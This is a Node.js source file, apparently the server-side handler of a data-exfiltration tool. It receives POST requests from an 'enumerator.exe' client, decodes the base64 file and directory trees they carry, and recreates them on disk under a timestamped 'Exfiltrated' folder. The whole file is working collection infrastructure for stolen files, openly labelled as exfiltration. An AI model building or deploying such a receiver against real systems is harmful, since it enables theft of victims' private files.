const fs = require("fs");
const path = require("path");
const { getTimestamp, getFileExtension, textExtensions } = require("../util.js");
const logging = require("../logging.js");

// By default, we create the objects in ../Exfiltrated
const EXFIL_DIR = path.join(`./Exfiltrated`, `${getTimestamp()} enumerator/`).replace(/\:/gmi, "-");

/**
 * Recursively creates directories and files for the JSON object
 * @param {JSON} fileJSON A JSON object representing the file (and directory) data 
 * @param {String} dir_path Directory path to write to currently
 */
function createFile(fileJSON, dir_path)
{
    // Loop through all file system elements in the current JSON
    // The inputs we get should be arrays
    fileJSON.forEach((jsonEntry) => {
        
        // fsElObject can either be another JSON Entry representing child directories, or it can be a base64 of the file value
        // fsElName can either be the file or directory name
        // Our array is filled with JSONs that have 1 key and 1 value
        const [fsElName, fsElObject] = Object.entries(jsonEntry)[0];

        // If we have a directory, mkdir that and then recursively pass it into createFile
        if (Array.isArray(fsElObject))
        {
            const child_dir_path = path.join(dir_path, fsElName);
            fs.mkdirSync(child_dir_path, {
                recursive: true
            });
            
            logging.log(`Creating directory ${child_dir_path}.`);
            createFile(fsElObject, child_dir_path);
        }  
        else
        {
            let filePath = path.resolve(dir_path, fsElName);

            // Get the file extension and check if we're writing UTF-8 (in cases such as '.txt') or binary (in cases such as '.docx')
            var fileExtension = getFileExtension(fsElName).toLowerCase();
            if (textExtensions.indexOf(fileExtension) != -1)
            {
                // If it is a text file
                // These files are in base64. In JS, you need to convert the base64 into a binary buffer, and then re-encode it in UTF-8
                let fileContent = Buffer.from(fsElObject, 'base64').toString("utf-8");
                fs.writeFileSync(filePath, fileContent, {encoding: "utf-8"});
            }
            else
            {
                // Decode from base64 and write it in binary if necessary
                let fileContent = Buffer.from(fsElObject, 'base64');
                fs.writeFileSync(filePath, fileContent, {encoding: "binary"});
            }

            logging.log(`Copied file ${fsElName} into ${filePath}.`);
        }
    });
}

/**
 * The POST function for enumerator.exe script.
 * This takes in the request JSON and "downloads the file" in the specified EXFIL_DIR directory
 */
module.exports = function(request) 
{
    logging.log("Executing enumerator POST function");

    // First, we're creating the directory in EXFIL_DIR to store our exfil'd data in
    fs.mkdirSync(EXFIL_DIR, {
        recursive: true
    });

    // Then, recursively create files under that directory

    /**
     * @type {JSON}
     * Remember that everything is wrapped under the Default key
     */
    let reqJSON = JSON.parse(request.body).Default;

    createFile(reqJSON, EXFIL_DIR);
}